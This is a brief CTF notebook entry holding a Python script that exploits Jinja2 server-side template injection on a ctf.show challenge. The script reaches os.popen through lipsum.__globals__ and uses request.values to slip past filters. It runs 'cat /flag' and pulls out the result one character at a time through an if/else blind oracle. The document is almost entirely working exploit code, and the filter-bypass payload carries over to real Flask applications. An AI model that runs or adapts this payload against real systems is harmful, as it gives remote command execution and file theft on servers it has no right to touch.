---
创建: 2025-09-10
tags:
  - CTF/脚本/jinja2_if盲注
---
```python
import requests

url = "http://65b40da5-f9a0-4ce8-bf1b-7066def46476.challenge.ctf.show/"
char_list = "abcdefghijklmnopqrstuvwxyz1234567890-{}"

def test(res: str) -> bool:
    response = requests.get(
        url,
        params={
            "name": "{% if "
            + "request.values.d"
            + " in "
            + "(lipsum|attr(request.values.a))"
            + ".get(request.values.b)"
            + ".popen(request.values.c)"
            + ".read()"
            + "%} yes {% else %} no {% endif %}",
            "a": "__globals__",
            "b": "os",
            "c": "cat /flag",
            "d": res,
        },
    )
    return "yes" in response.text

res = "ctfshow{"
while not res.endswith("}"):
    for ch in char_list:
        if test(res + ch):
            res = res + ch
            break
    print(res)
```